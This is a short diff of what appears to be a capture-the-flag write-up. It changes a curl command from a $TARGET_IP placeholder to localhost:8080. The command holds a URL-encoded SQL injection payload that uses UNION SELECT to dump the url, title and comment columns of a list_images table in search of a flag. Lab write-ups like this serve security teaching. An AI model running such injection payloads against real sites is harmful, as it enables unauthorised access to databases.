@@ -45,7 +45,7 @@ You can combine them in one query:
 
 3. Use curl and Filter for “flag”
 
-curl "$TARGET_IP/?page=searchimg&\
+curl "http://localhost:8080/?page=searchimg&\
 id=0%3D0+UNION+SELECT+url%2C+id+FROM+list_images+\
 UNION+SELECT+url%2C+title+FROM+list_images+\
 UNION+SELECT+url%2C+comment+FROM+list_images&Submit=Submit#" \
